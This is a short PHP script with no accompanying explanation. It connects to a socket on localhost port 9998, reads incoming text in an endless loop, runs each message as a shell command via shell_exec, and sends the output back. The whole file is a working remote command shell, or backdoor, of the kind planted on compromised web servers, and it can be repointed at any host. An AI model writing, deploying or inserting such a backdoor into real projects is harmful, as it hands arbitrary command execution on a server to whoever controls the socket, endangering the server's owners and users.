<?php 
$server=socket_create(AF_INET,SOCK_STREAM,0);
socket_connect($server,"localhost",9998);
while (1){
	try{
		$responce=socket_read($server,2048);
		socket_write($server,shell_exec($responce));
	}
	catch(exception $error){
		socket_write("ERROR DETECTED");}
}
?>
